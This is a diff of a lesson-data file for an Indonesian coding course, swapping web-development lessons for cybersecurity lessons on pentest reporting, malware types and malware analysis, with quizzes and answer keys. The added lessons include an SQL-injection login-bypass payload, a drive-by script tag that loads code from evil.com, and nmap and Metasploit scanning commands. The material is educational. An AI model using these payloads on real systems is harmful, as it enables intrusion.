-    trim: true,
-    minlength: 3,
-    maxlength: 50
-  },
-  email: {
-    type: String,
-    required: true,
-    unique: true,
-    lowercase: true,
-    match: /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/
-  },
-  umur: {
-    type: Number,
-    min: 0,
-    max: 120,
-    default: 0
-  },
-  role: {
-    type: String,
-    enum: ["user", "admin"],
-    default: "user"
-  },
-  aktif: {
-    type: Boolean,
-    default: true
-  },
-  hobi: [String],
-  createdAt: {
-    type: Date,
-    default: Date.now
-  }
-});
-
-const User = mongoose.model("User", userSchema);
-\`\`\`
-
-## Operasi CRUD dengan Mongoose
-
-\`\`\`javascript
-// CREATE
-const user = new User({ nama: "Budi", email: "budi@mail.com", umur: 25 });
-await user.save();
-// Atau
-const user2 = await User.create({ nama: "Andi", email: "andi@mail.com" });
-
-// READ
-const all = await User.find();
-const satu = await User.findById("userId");
-const filter = await User.find({ umur: { $gte: 25 } });
-const satuFilter = await User.findOne({ email: "budi@mail.com" });
-
-// UPDATE
-await User.updateOne({ _id: id }, { umur: 26 });
-await User.findByIdAndUpdate(id, { umur: 26 }, { new: true });
-
-// DELETE
-await User.deleteOne({ _id: id });
-await User.findByIdAndDelete(id);
-\`\`\`
-
-## Validation
-
-Mongoose otomatis validasi berdasarkan schema:
-
-\`\`\`javascript
-try {
-  await User.create({ nama: "A", email: "invalid" }); 
-  // Error: nama minimal 3 char, email tidak valid
-} catch (err) {
-  console.log(err.message);
-}
-\`\`\`
-
-## Instance Methods dan Static Methods
-
-\`\`\`javascript
-// Instance method
-userSchema.methods.getFullName = function() {
-  return this.nama + " (" + this.email + ")";
-};
-
-// Static method
-userSchema.statics.findByRole = function(role) {
-  return this.find({ role });
-};
-
-const admin = await User.findByRole("admin");
-\`\`\`
-
-## Middleware (Hooks)
-
-\`\`\`javascript
-// Pre-save: hash password sebelum save
-userSchema.pre("save", async function(next) {
-  if (!this.isModified("password")) return next();
-  this.password = await bcrypt.hash(this.password, 10);
-  next();
-});
-
-// Post-save: log setelah save
-userSchema.post("save", function(doc) {
-  console.log("User tersimpan:", doc.nama);
-});
-\`\`\`
-
-## Populate (Reference)
-
-\`\`\`javascript
-const postSchema = new Schema({
-  judul: String,
-  author: { type: Schema.Types.ObjectId, ref: "User" }
-});
-
-const post = await Post.find().populate("author", "nama email");
-// Akan menyertakan data user di field author
-\`\`\`
-
-> **Best Practice:** Selalu definisikan schema dengan validasi ketat. Gunakan middleware \`pre\` untuk hash password dan validasi kompleks. Gunakan \`populate\` untuk join reference.`,
-    quiz: [
-      {
-        question: "Apa itu Mongoose?",
-        options: [
-          "Database NoSQL",
-          "ODM (Object Data Modeling) untuk MongoDB",
-          "Framework web",
-          "Library frontend"
-        ],
-        answer: 1,
-        explanation: "Mongoose adalah ODM untuk MongoDB—memberikan schema, validasi, dan abstraction di atas MongoDB driver native."
-      },
-      {
-        question: "Method Mongoose untuk mendapatkan document dengan relasi terisi?",
-        options: ["find()", "populate()", "join()", "include()"],
-        answer: 1,
-        explanation: "populate() mengisi field reference dengan document lengkap. Mirip JOIN di SQL. Contoh: Post.find().populate('author')."
-      },
-      {
-        question: "Apa fungsi pre middleware di Mongoose?",
-        options: [
-          "Jalankan setelah operasi",
-          "Jalankan sebelum operasi (misal hash password sebelum save)",
-          "Hapus document",
-          "Validasi input user"
-        ],
-        answer: 1,
-        explanation: "pre middleware dijalankan SEBELUM operasi (pre-save, pre-validate). Sering dipakai untuk hash password, generate slug, atau set default."
-      }
-    ]
-  },
-  {
-    level: 6,
-    order: 6,
-    title: "Project: Sistem Login",
-    slug: "project-sistem-login",
-    description: "Bangun sistem login lengkap dengan registrasi, JWT, hash password, dan MongoDB.",
-    icon: "🔑",
-    isProject: true,
-    content: `# Project: Sistem Login dengan Database
-
-Pada project ini, kamu akan membangun **sistem autentikasi lengkap** dengan registrasi, login, JWT, hash password, dan penyimpanan di MongoDB. Project ini menggabungkan Level 5 (backend) dan Level 6 (database).
-
-## Fitur yang Dibangun
-
-- **Register** user baru dengan validasi
-- **Login** dengan email & password
-- **Hash password** dengan bcrypt
-- **Generate JWT** setelah login
-- **Middleware auth** untuk protected routes
-- **Profile** (butuh login)
-- **Update profile** (nama, password)
-- **Refresh token** (opsional)
-- **Logout** (blacklist token)
-- **Role-based access** (user & admin)
-
-## Tech Stack
-
-- **Express.js** - web framework
-- **Mongoose** - ODM MongoDB
-- **bcrypt** - hash password
-- **jsonwebtoken** - JWT
-- **joi** - validasi input
-- **dotenv** - environment variables
-
-## Struktur Project
-
-\`\`\`
-sistem-login/
-├── src/
-│   ├── config/
-│   │   └── db.js
-│   ├── models/
-│   │   └── User.js
-│   ├── middleware/
-│   │   ├── auth.js
-│   │   └── validate.js
-│   ├── controllers/
-│   │   └── authController.js
-│   ├── routes/
-│   │   └── authRoutes.js
-│   ├── utils/
-│   │   └── token.js
-│   └── app.js
-├── .env
-└── package.json
-\`\`\`
-
-## Model User dengan Hash Password
-
-\`\`\`javascript
-// models/User.js
-const mongoose = require("mongoose");
-const bcrypt = require("bcrypt");
-
-const userSchema = new mongoose.Schema({
-  nama: { type: String, required: true, trim: true },
-  email: { type: String, required: true, unique: true, lowercase: true },
-  password: { type: String, required: true, minlength: 6, select: false },
-  role: { type: String, enum: ["user", "admin"], default: "user" },
-  createdAt: { type: Date, default: Date.now }
-});
-
-// Hash password sebelum save
-userSchema.pre("save", async function(next) {
-  if (!this.isModified("password")) return next();
-  this.password = await bcrypt.hash(this.password, 10);
-  next();
-});
-
-// Method untuk compare password
-userSchema.methods.matchPassword = function(enteredPassword) {
-  return bcrypt.compare(enteredPassword, this.password);
-};
-
-module.exports = mongoose.model("User", userSchema);
-\`\`\`
-
-## Controller: Register & Login
-
-\`\`\`javascript
-// controllers/authController.js
-const User = require("../models/User");
-const jwt = require("jsonwebtoken");
-
-const generateToken = (id) => {
-  return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: "1d" });
-};
-
-exports.register = async (req, res) => {
-  try {
-    const { nama, email, password } = req.body;
-    
-    const exists = await User.findOne({ email });
-    if (exists) return res.status(400).json({ error: "Email sudah terdaftar" });
-    
-    const user = await User.create({ nama, email, password });
-    res.status(201).json({
-      _id: user._id,
-      nama: user.nama,
-      email: user.email,
-      token: generateToken(user._id)
-    });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-};
-
-exports.login = async (req, res) => {
-  try {
-    const { email, password } = req.body;
-    
-    const user = await User.findOne({ email }).select("+password");
-    if (!user) return res.status(401).json({ error: "Email tidak terdaftar" });
-    
-    const valid = await user.matchPassword(password);
-    if (!valid) return res.status(401).json({ error: "Password salah" });
-    
-    res.json({
-      _id: user._id,
-      nama: user.nama,
-      email: user.email,
-      role: user.role,
-      token: generateToken(user._id)
-    });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-};
-\`\`\`
-
-## Langkah Implementasi
-
-1. **Setup project**: install Express, Mongoose, bcrypt, jsonwebtoken, joi, dotenv
-2. **Konfigurasi .env**: \`MONGODB_URI\`, \`JWT_SECRET\`, \`PORT\`
-3. **Buat koneksi MongoDB** di config/db.js
-4. **Buat User model** dengan schema, hash password pre-hook, dan method matchPassword
-5. **Implementasi register**: validasi input, cek email unik, hash password, simpan, kirim token
-6. **Implementasi login**: cari user, compare password, kirim token
-7. **Buat auth middleware**: verifikasi JWT, simpan user di req
-8. **Buat protected route** (misal \`/api/profile\`)
-9. **Implementasi update profile** (nama, ganti password)
-10. **Implementasi role-based middleware** (admin only)
-11. **Error handling** terpusat
-12. **Test dengan Postman**: register, login, akses protected route
-
-## Tantangan Tambahan
-
-- **Email verification** saat register
-- **Forgot password** via email
-- **Refresh token** mechanism
-- **Rate limiting** di endpoint login
-- **OAuth** (Google, GitHub login)
-- **2FA** (two-factor authentication)`,
-    quiz: [
-      {
-        question: "Mengapa password harus di-hash di pre-save hook Mongoose?",
-        options: [
-          "Agar password lebih pendek",
-          "Agar password tidak tersimpan plain-text (aman jika DB bocor)",
-          "Agar login lebih cepat",
-          "Untuk kompresi data"
-        ],
-        answer: 1,
-        explanation: "Hash password di pre-save memastikan password tidak pernah disimpan plain-text. Jika database bocor, password tetap aman karena hash satu arah."
-      },
-      {
-        question: "Mengapa field password di-set \`select: false\` di schema?",
-        options: [
-          "Agar tidak bisa disimpan",
-          "Agar tidak ikut terkirim saat query normal (keamanan)",
-          "Untuk kompresi",
-          "Agar password wajib diisi ulang"
-        ],
-        answer: 1,
-        explanation: "select: false membuat password tidak ikut di hasil find() biasa. Saat login, gunakan .select('+password') untuk eksplisit mengambilnya."
-      },
-      {
-        question: "Apa yang dilakukan auth middleware?",
-        options: [
-          "Membuat user baru",
-          "Verifikasi JWT dari header dan simpan info user di req",
-          "Hash password",
-          "Kirim email verifikasi"
-        ],
-        answer: 1,
-        explanation: "Auth middleware mengambil token dari header Authorization, verifikasi JWT, dan simpan decoded user info di req.user untuk handler berikutnya."
-      }
-    ]
-  },
-
-  // ==================== LEVEL 7 - PROJECT AKHIR ====================
-  {
-    level: 7,
-    order: 1,
-    title: "Website Portfolio",
-    slug: "project-portfolio",
-    description: "Bangun website portfolio personal yang menampilkan profil, skills, project, dan kontak.",
-    icon: "💼",
-    isProject: true,
-    content: `# Project: Website Portfolio
-
-**Website Portfolio** adalah project akhir pertama yang wajib kamu bangun. Project ini menggabungkan semua skill yang telah dipelajari dari Level 1-6: HTML, CSS, JavaScript, dan opsional backend untuk contact form.
-
-## Tujuan Project
-
-Membangun website portfolio profesional yang menampilkan:
-- Profil dan bio singkat
-- Skills & teknologi yang dikuasai
-- Daftar project yang pernah dibuat
-- Pengalaman & pendidikan
-- Form kontak yang berfungsi
-- Tampilan **responsive** di semua device
-
-## Fitur Wajib
-
-- **Hero section** dengan foto dan tagline
-- **About section** dengan bio lengkap
-- **Skills section** dengan ikon teknologi
-- **Projects section** dengan card project (gambar, deskripsi, link)
-- **Experience section** (timeline pengalaman)
-- **Contact form** dengan validasi
-- **Navigation** smooth scroll
-- **Dark/Light mode** toggle
-- **Responsive** untuk mobile, tablet, desktop
-- **SEO friendly** (meta tags, semantic HTML)
-
-## Tech Stack
-
-### Frontend
-- **HTML5** semantic
-- **CSS3** (Flexbox, Grid, animations)
-- **JavaScript** (vanilla atau framework)
-- **Tailwind CSS** atau Bootstrap (opsional)
-- **Font Awesome** untuk ikon
-
-### Opsional Backend
-- **Node.js + Express** untuk contact form
-- **Nodemailer** untuk kirim email
-- **MongoDB** untuk simpan pesan
-
-## Struktur Project
-
-\`\`\`
-portfolio/
-├── index.html
-├── css/
-│   ├── style.css
-│   └── responsive.css
-├── js/
-│   ├── main.js
-│   └── form.js
-├── assets/
-│   ├── images/
-│   └── resume.pdf
-├── server/           (opsional)
-│   └── app.js
-└── README.md
-\`\`\`
-
-## Langkah Implementasi
-
-### 1. Planning & Wireframe (1 hari)
-- Sketsa layout di paper atau Figma
-- Tentukan color palette dan typography
-- Kumpulkan konten: foto, project, deskripsi
-
-### 2. Struktur HTML (1 hari)
-\`\`\`html
-<header>
-  <nav>
-    <div class="logo">Nama Kamu</div>
-    <ul class="nav-links">
-      <li><a href="#about">About</a></li>
-      <li><a href="#skills">Skills</a></li>
-      <li><a href="#projects">Projects</a></li>
-      <li><a href="#contact">Contact</a></li>
-    </ul>
-  </nav>
-</header>
-
-<section id="hero">
-  <h1>Halo, Saya <span>Nama Kamu</span></h1>
-  <p>Full-Stack Web Developer</p>
-  <a href="#contact" class="btn">Hubungi Saya</a>
-</section>
-
-<section id="about">...</section>
-<section id="skills">...</section>
-<section id="projects">...</section>
-<section id="contact">
-  <form id="contact-form">
-    <input type="text" name="nama" required>
-    <input type="email" name="email" required>
-    <textarea name="pesan" required></textarea>
-    <button type="submit">Kirim</button>
-  </form>
-</section>
-\`\`\`
-
-### 3. Styling CSS (2-3 hari)
-- Layout dengan Flexbox/Grid
-- Animasi hover, scroll reveal
-- Responsive breakpoints
-- Dark mode dengan CSS variables
-
-### 4. JavaScript Interaktif (1-2 hari)
-- Smooth scroll navigation
-- Mobile hamburger menu
-- Form validation
-- Scroll animations (Intersection Observer)
-- Theme toggle
-
-### 5. Contact Form Backend (opsional, 1 hari)
-\`\`\`javascript
-// server/app.js
-app.post("/api/contact", async (req, res) => {
-  const { nama, email, pesan } = req.body;
-  // Kirim email dengan Nodemailer atau simpan ke DB
-  await sendEmail(nama, email, pesan);
-  res.json({ success: true });
-});
-\`\`\`
-
-### 6. Deployment (1 hari)
-- Deploy frontend: **Vercel**, **Netlify**, atau **GitHub Pages**
-- Deploy backend: **Railway**, **Render**, atau **Vercel**
-- Custom domain (opsional)
-
-## Tantangan Tambahan
-
-- **Blog section** dengan CMS sederhana
-- **Project filter** berdasarkan teknologi
-- **Multi-language** (Indonesia & English)
-- **Animasi loading** saat awal buka
-- **Print-friendly** resume
-- **Analytics** (Google Analytics)
-
-## Tips Sukses
-
-- **Performance**: optimasi gambar, minify CSS/JS
-- **Accessibility**: alt text, semantic HTML, keyboard nav
-- **SEO**: meta tags, Open Graph, structured data
-- **Konten**: tulis deskripsi yang menarik dan jelas
-
-> **Hasil Akhir:** Portfolio yang menarik, cepat, dan profesional bisa menjadi kartu nama digital kamu untuk melamar kerja atau freelance.`,
-    quiz: [
-      {
-        question: "Apa fitur yang paling penting di website portfolio?",
-        options: [
-          "Animasi yang rumit",
-          "Tampilan project terbaik dan kontak yang jelas",
-          "Banyak warna",
-          "Musik latar"
-        ],
-        answer: 1,
-        explanation: "Tujuan portfolio adalah showcase project dan memudahkan recruiter menghubungimu. Konten dan kontak jelas lebih penting dari animasi rumit."
-      },
-      {
-        question: "Mengapa website portfolio harus responsive?",
-        options: [
-          "Agar loading cepat",
-          "Agar tampil baik di semua device (mobile, tablet, desktop)",
-          "Agar SEO naik",
-          "Tidak perlu responsive"
-        ],
-        answer: 1,
-        explanation: "Banyak recruiter mengakses portfolio via HP. Responsive memastikan website tampil optimal di semua ukuran layar."
-      },
-      {
-        question: "Platform mana yang populer untuk deploy website portfolio statis gratis?",
-        options: ["AWS EC2", "Vercel atau Netlify", "DigitalOcean", "Heroku"],
-        answer: 1,
-        explanation: "Vercel dan Netlify menyediakan hosting gratis untuk website statis dengan custom domain, HTTPS, dan CI/CD otomatis dari GitHub."
-      }
-    ]
-  },
-  {
-    level: 7,
-    order: 2,
-    title: "Blog",
-    slug: "project-blog",
-    description: "Bangun platform blog lengkap dengan CMS, kategori, komentar, dan dashboard admin.",
+    title: "Project: Pentest Report",
+    slug: "project-pentest-report",
+    description: "Proyek menyusun laporan penetration test profesional.",
     icon: "📝",
     isProject: true,
-    content: `# Project: Blog Platform
+    content: `# Project: Pentest Report
 
-**Blog Platform** adalah project full-stack yang menggabungkan frontend, backend, dan database. Kamu akan membangun aplikasi blog lengkap dengan CMS untuk menulis artikel, sistem kategori, dan komentar.
+Pada proyek akhir Level 5, Anda akan menyusun **laporan penetration test profesional** berdasarkan simulasi engagement. Laporan ini akan mengomunikasikan temuan kepada stakeholder teknis dan non-teknis dengan jelas.
 
-## Fitur Utama
+## Skenario
 
-### Publik (Frontend)
-- **List artikel** dengan pagination
-- **Detail artikel** dengan markdown rendering
-- **Search** artikel by judul/konten
-- **Filter** by kategori dan tag
-- **Komentar** di setiap artikel
-- **Share** ke social media
-- **Related articles** di bawah artikel
-- **Author profile**
+Lakukan pentest pada lab DVWA atau Metasploitable2:
 
-### Admin (CMS Dashboard)
-- **Login** admin
-- **CRUD artikel** (create, read, update, delete)
-- **Rich text editor** (markdown/WYSIWYG)
-- **Upload gambar** untuk artikel
-- **Kelola kategori & tag**
-- **Moderasi komentar**
-- **Draft & publish** scheduling
-- **Analytics** sederhana (views, popular posts)
+\`\`\`bash
+# Setup lab
+docker run -d -p 80:80 vulnerables/web-dvwa
+# Atau Metasploitable2 di VirtualBox (host-only network)
 
-## Tech Stack
-
-### Frontend
-- **Next.js** atau vanilla JS
-- **Tailwind CSS** untuk styling
-- **marked.js** untuk render markdown
-- **highlight.js** untuk syntax highlighting
-
-### Backend
-- **Node.js + Express**
-- **Mongoose** untuk MongoDB
-- **JWT** untuk auth admin
-- **Multer** untuk upload gambar
-- **slugify** untuk URL friendly
-
-### Database Schema
-\`\`\`javascript
-// Article
-{
-  judul: String,
-  slug: String,
-  konten: String,        // markdown
-  excerpt: String,
-  gambar: String,        // URL
-  kategori: ObjectId,
-  tags: [String],
-  author: ObjectId,
-  status: "draft" | "published",
-  views: Number,
-  createdAt: Date,
-  updatedAt: Date
-}
-
-// Kategori
-{ nama: String, slug: String, deskripsi: String }
-
-// Komentar
-{ 
-  artikel: ObjectId, 
-  nama: String, 
-  email: String, 
-  teks: String,
-  status: "pending" | "approved",
-  createdAt: Date 
-}
+# Lakukan pentest lengkap
+nmap -sS -sV -sC 192.168.56.102
+searchsploit <versi service>
+msfconsole -q
 \`\`\`
 
-## Struktur Project
+## Struktur Laporan
 
-\`\`\`
-blog/
-├── client/                # Frontend
-│   ├── src/
-│   │   ├── pages/
-│   │   ├── components/
-│   │   └── lib/
-│   └── package.json
-├── server/                # Backend API
-│   ├── src/
-│   │   ├── models/
-│   │   ├── controllers/
-│   │   ├── routes/
-│   │   ├── middleware/
-│   │   └── app.js
-│   └── package.json
-└── README.md
-\`\`\`
+\`\`\`text
+1. EXECUTIVE SUMMARY
+   - Latar belakang engagement
+   - Ringkasan risiko (jumlah finding per severity)
+   - Rekomendasi prioritas
 
-## Langkah Implementasi
+2. METHODOLOGY
+   - Scope & boundary
+   - Tools yang digunakan
+   - Standar acuan (OWASP, PTES, NIST)
 
-### 1. Setup & Database (1-2 hari)
-- Buat Express server + MongoDB connection
-- Definisikan schema Article, Kategori, Komentar, User
-- Setup auth admin dengan JWT
+3. DETAILED FINDINGS
+   Untuk setiap kerentanan:
+   - Title & ID (e.g. VULN-001)
+   - Severity (CVSS + vektor)
+   - Deskripsi kerentanan
+   - Affected asset
+   - PoC (screenshot, request, response)
+   - Impact
+   - Remediation step-by-step
 
-### 2. API Backend (3-4 hari)
-\`\`\`javascript
-// routes/articles.js
-router.get("/", getArticles);              // list dengan pagination
-router.get("/:slug", getArticle);          // detail by slug
-router.post("/", auth, createArticle);     // admin only
-router.put("/:id", auth, updateArticle);
-router.delete("/:id", auth, deleteArticle);
+4. RISK MATRIX
+   - Tabel likelihood × impact
 
-// routes/comments.js
-router.post("/:articleId/comments", addComment);
-router.get("/:articleId/comments", getComments);
-router.delete("/:id", auth, deleteComment); // admin moderate
+5. APPENDIX
+   - Raw scan output
+   - Tool configuration
+   - Glossary
 \`\`\`
 
-### 3. Frontend Public (3-4 hari)
-- Halaman home dengan list artikel
-- Halaman detail artikel (render markdown)
-- Search bar dengan debounce
-- Filter kategori & tag
-- Form komentar
+## Contoh Finding
 
-### 4. Admin Dashboard (3-4 hari)
-- Halaman login
-- Dashboard dengan statistik
-- List artikel dengan action edit/delete
-- Form create/edit dengan markdown editor
-- Upload gambar
-- Manajemen komentar (approve/reject)
+\`\`\`markdown
+### VULN-001: SQL Injection pada /login
 
-### 5. Fitur Tambahan (2-3 hari)
-- **SEO**: meta tags dinamis, sitemap.xml
-- **RSS feed**
-- **Social share** buttons
-- **Reading time** estimation
-- **Table of contents** otomatis
+**Severity**: Critical (CVSS 9.8)
 
-### 6. Deployment (1 hari)
-- Frontend: Vercel/Netlify
-- Backend: Railway/Render
-- Database: MongoDB Atlas
-- Image storage: Cloudinary (gratis)
+**Deskripsi**: Parameter \`username\` pada form login rentan SQLi
+in-band, memungkinkan bypass autentikasi.
 
-## Tantangan Lanjutan
-
-- **Multi-author** (beberapa penulis dengan role)
-- **Newsletter** subscribe
-- **Email notification** untuk komentar baru
-- **Search full-text** dengan Algolia
-- **PWA** (Progressive Web App)
-- **AMP** pages untuk mobile cepat
-
-## Contoh: Controller Get Articles
-
-\`\`\`javascript
-exports.getArticles = async (req, res) => {
-  const page = parseInt(req.query.page) || 1;
-  const limit = 10;
-  const skip = (page - 1) * limit;
-  
-  const query = { status: "published" };
-  if (req.query.kategori) query.kategori = req.query.kategori;
-  if (req.query.search) {
-    query.$text = { $search: req.query.search };
-  }
-  
-  const articles = await Article.find(query)
-    .populate("kategori author", "nama slug")
-    .sort({ createdAt: -1 })
-    .skip(skip)
-    .limit(limit);
-    
-  const total = await Article.countDocuments(query);
-  
-  res.json({
-    data: articles,
-    currentPage: page,
-    totalPages: Math.ceil(total / limit),
-    total
-  });
-};
+**PoC**:
+\`\`\`
+POST /login HTTP/1.1
+username=admin'--&password=anything
+→ HTTP 302 redirect ke /dashboard
 \`\`\`
 
-> **Tips:** Mulai dengan MVP (Minimum Viable Product)—artikel CRUD + tampilan publik. Tambah fitur kompleks secara bertahap.`,
+**Remediation**: Gunakan prepared statement dan ORM dengan
+parameter binding. Aktifkan WAF sebagai mitigasi tambahan.
+\`\`\`
+
+## Deliverables
+
+\`\`\`text
+- PDF laporan (15-30 halaman)
+- Lampiran: file Burp/Nmap output
+- Video walkthrough eksploitasi (5-10 menit)
+- Slide executive summary (5-10 slide)
+\`\`\`
+
+> Laporan adalah produk akhir pentest. Klien tidak melihat terminal Anda — mereka membaca laporan. Kualitas dokumentasi menentukan apakah temuan akan diperbaiki atau tidak.`,
     quiz: [
       {
-        question: "Mengapa slug lebih baik digunakan di URL blog daripada ID?",
-        options: [
-          "Lebih cepat di database",
-          "Lebih SEO friendly dan mudah dibaca manusia",
-          "Lebih aman",
-          "Menghemat storage"
-        ],
+        question: "Bagian laporan pentest untuk audiens non-teknis?",
+        options: ["Appendix", "Executive Summary", "Raw output", "Glossary"],
         answer: 1,
-        explanation: "Slug seperti '/belajar-nodejs' lebih SEO friendly dan mudah dibaca daripada '/article/6123abc'. Search engine lebih mudah mengindex."
+        explanation: "Executive Summary ditujukan untuk manajemen/non-teknis, berisi ringkasan risiko dan rekomendasi prioritas."
       },
       {
-        question: "Apa kegunaan middleware auth di admin dashboard blog?",
-        options: [
-          "Mempercepat loading",
-          "Memastikan hanya admin yang bisa CRUD artikel",
-          "Mengkompres gambar",
-          "Render markdown"
-        ],
+        question: "Yang harus ada di setiap finding pentest?",
+        options: ["Foto penyerang", "Severity, PoC, Impact, Remediation", "Harga tool", "Kode sumber klien"],
         answer: 1,
-        explanation: "Auth middleware memverifikasi JWT dan memastikan hanya admin yang bisa create/update/delete artikel. Tanpa auth, siapa saja bisa mengubah konten."
+        explanation: "Setiap finding harus mencakup severity, PoC bukti eksploitasi, impact bisnis, dan langkah remediasi."
       },
       {
-        question: "Library apa yang umum digunakan untuk render markdown menjadi HTML?",
-        options: ["lodash", "marked.js", "axios", "mongoose"],
+        question: "Lab aplikasi rentan populer untuk latihan?",
+        options: ["DVWA", "Gmail", "Facebook", "Twitter"],
+        answer: 0,
+        explanation: "DVWA (Damn Vulnerable Web Application) adalah lab PHP yang sengaja dibuat rentan untuk belajar pentest."
+      }
+    ]
+  },
+
+  // ==================== LEVEL 6 - FORENSIK & MALWARE (7) ====================
+  {
+    level: 6,
+    order: 1,
+    title: "Pengenalan Malware",
+    slug: "pengenalan-malware",
+    description: "Mengenal apa itu malware dan cara kerjanya.",
+    icon: "🦠",
+    isProject: false,
+    content: `# Pengenalan Malware
+
+**Malware** (malicious software) adalah perangkat lunak yang dibuat dengan niat jahat — mencuri data, merusak sistem, mengintai, atau mendapatkan akses tidak sah. Memahami malware adalah fondasi defense siber modern.
+
+## Tujuan Malware
+
+\`\`\`text
+- Pencurian data (kredensial, finansial, IP)
+- Spionase korporat / negara
+- Pemerasan (ransomware)
+- Botnet untuk DDoS atau cryptomining
+- Sabotase infrastruktur
+\`\`\`
+
+## Siklus Hidup Malware
+
+\`\`\`text
+1. Reconnaissance     (pemilihan target)
+2. Delivery/Infection (phishing, drive-by, USB)
+3. Execution          (drop payload)
+4. Persistence        (registry, scheduled task)
+5. C2 Communication   (command & control)
+6. Lateral movement   (menyebar ke host lain)
+7. Action on objective (ekfiltrasi / enkripsi)
+\`\`\`
+
+## Vektor Infeksi Umum
+
+\`\`\`bash
+# Phishing email dengan attachment
+attachment.exe → dropper → download trojan
+
+# Drive-by download
+<script src="https://evil.com/exploit.js"></script>
+
+# USB drop attack
+autorun.inf → payload
+
+# Software supply chain
+compromised npm/pip package
+\`\`\`
+
+## Indikator Kompromi (IoC)
+
+\`\`\`text
+- Hash file mencurigakan (MD5/SHA256)
+- Domain & IP C2
+- Pola network anomali
+- Registry key persistence
+- Mutex yang unik
+- Pola behavioral (proses tidak biasa)
+\`\`\`
+
+> Malware modern tidak lagi berdiri sendiri — biasanya bagian dari kampanye APT yang terorganisir. Analisis IoC dan threat intelligence adalah kunci deteksi dini.`,
+    quiz: [
+      {
+        question: "Apa itu malware?",
+        options: ["Software open-source", "Software dengan niat jahat", "Antivirus", "Driver hardware"],
         answer: 1,
-        explanation: "marked.js adalah library populer untuk convert markdown ke HTML. Sering dipakai di blog untuk render konten yang ditulis dalam markdown."
+        explanation: "Malware (malicious software) adalah perangkat lunak yang dibuat dengan niat jahat untuk merusak atau mencuri."
+      },
+      {
+        question: "Vektor infeksi malware paling umum?",
+        options: ["Phishing email", "Update OS", "Backup", "Defragmentasi"],
+        answer: 0,
+        explanation: "Phishing email dengan attachment atau link berbahaya adalah vektor infeksi malware paling umum."
+      },
+      {
+        question: "Apa itu IoC?",
+        options: ["Internet of Computers", "Indicator of Compromise", "Index of Cryptography", "Internal Operation Center"],
+        answer: 1,
+        explanation: "IoC (Indicator of Compromise) adalah artefak (hash, IP, domain) yang mengindikasikan kompromi sistem."
+      }
+    ]
+  },
+  {
+    level: 6,
+    order: 2,
+    title: "Jenis-Jenis Malware",
+    slug: "jenis-jenis-malware",
+    description: "Virus, worm, trojan, ransomware, spyware, rootkit.",
+    icon: "🐛",
+    isProject: false,
+    content: `# Jenis-Jenis Malware
+
+Setiap jenis malware memiliki karakteristik, vektor penyebaran, dan tujuan berbeda. Mengenali jenis malware membantu menentukan strategi analisis dan mitigasi yang tepat.
+
+## Klasifikasi Utama
+
+### Virus
+Menempel pada file legit & menyebar saat file dijalankan.
+
+\`\`\`text
+- Butuh host (file executable)
+- Aktivasi: user menjalankan file terinfeksi
+- Contoh: CIH, ILOVEYOU
+\`\`\`
+
+### Worm
+Menginfeksi sendiri tanpa interaksi user, memanfaatkan jaringan.
+
+\`\`\`bash
+# Contoh worm modern memanfaatkan SMB
+# WannaCry memakai EternalBlue (MS17-010) untuk menyebar
+nmap -p445 --script smb-vuln-ms17-010 target
+\`\`\`
+
+### Trojan
+Menyamar sebagai software legit, membuka backdoor.
+
+### Ransomware
+Mengenkripsi file korban dan minta tebusan.
+
+\`\`\`text
+Contoh terkenal:
+- WannaCry       (2017, global)
+- NotPetya       (2017, sabotage)
+- Ryuk, Conti    (targeted enterprise)
+- LockBit        (RaaS)
+\`\`\`
+
+### Spyware / Keylogger
+Mengintai aktivitas & mencuri data tanpa terdeteksi.
+
+### Rootkit
+Bersembunyi di kernel/firmware, sulit dideteksi.
+
+\`\`\`bash
+# Deteksi rootkit
+chkrootkit
+rkhunter --check
+\`\`\`
+
+### Adware & PUP
+Menampilkan iklan, sering bundling dengan software gratis.
+
+### Botnet
+Jaringan zombie yang dikendalikan C2 untuk DDoS atau cryptomining.
+
+## Tabel Perbandingan
+
+\`\`\`text
+Tipe         | Butuh Host | Self-spread | Tujuan
+-------------|------------|-------------|--------
+Virus        | Ya         | Tidak       | Rusak
+Worm         | Tidak      | Ya          | Sebarkan
+Trojan       | Tidak      | Tidak       | Backdoor
+Ransomware   | Tidak      | Variatif    | Tebusan
+Rootkit      | Variatif   | Tidak       | Sembunyi
+\`\`\`
+
+> Malware modern sering bersifat hybrid — satu sampel bisa trojan + ransomware + worm. Klasifikasi membantu, tapi analisis behavioral lebih penting daripada label statis.`,
+    quiz: [
+      {
+        question: "Malware yang mengenkripsi file dan minta tebusan?",
+        options: ["Virus", "Ransomware", "Adware", "Rootkit"],
+        answer: 1,
+        explanation: "Ransomware mengenkripsi file korban dan meminta tebusan (umumnya cryptocurrency) untuk dekripsi."
+      },
+      {
+        question: "Apa beda virus dan worm?",
+        options: ["Sama saja", "Virus butuh host file, worm self-spreading", "Worm lebih kecil", "Virus lebih berbahaya"],
+        answer: 1,
+        explanation: "Virus butuh file host dan aktivasi user, sementara worm dapat menyebar sendiri via jaringan."
+      },
+      {
+        question: "Malware yang bersembunyi di kernel level?",
+        options: ["Spyware", "Rootkit", "Adware", "Trojan"],
+        answer: 1,
+        explanation: "Rootkit bersembunyi di kernel/firmware sehingga sulit dideteksi tools user-space biasa."
+      }
+    ]
+  },
+  {
+    level: 6,
+    order: 3,
+    title: "Malware Analysis Basics",
+    slug: "malware-analysis-basics",
+    description: "Static dan dynamic analysis untuk menganalisis malware.",
+    icon: "🔬",
+    isProject: false,
+    content: `# Malware Analysis Basics
+
+**Malware Analysis** adalah proses memahami cara kerja, tujuan, dan asal-usul sebuah sampel malware. Dibagi menjadi dua pendekatan utama: **static** (menganalisis tanpa menjalankan) dan **dynamic** (mengamati saat malware dijalankan di sandbox).
+
+## Static Analysis
+
+Menganalisis file tanpa eksekusi.
+
+\`\`\`bash
+# Identifikasi tipe file & hash
+file sample.exe
+md5sum sample.exe
+sha256sum sample.exe
+
+# Strings extraction
+strings -n 8 sample.exe | grep -iE "http|\.exe|key"
+
+# PE header analysis
+pev sample.exe
+pestudio sample.exe
+\`\`\`
+
+## Dynamic Analysis
+
+Menjalankan malware di environment terisolasi.
+
+\`\`\`bash
+# Setup sandbox (FLARE-VM atau REMnux)
+# 1. Snapshot VM bersih
+# 2. Jalankan monitoring:
+#    - Procmon (process activity)
+#    - Wireshark (network)
+#    - Regshot (registry diff)
+# 3. Eksekusi malware
+# 4. Capture behavior
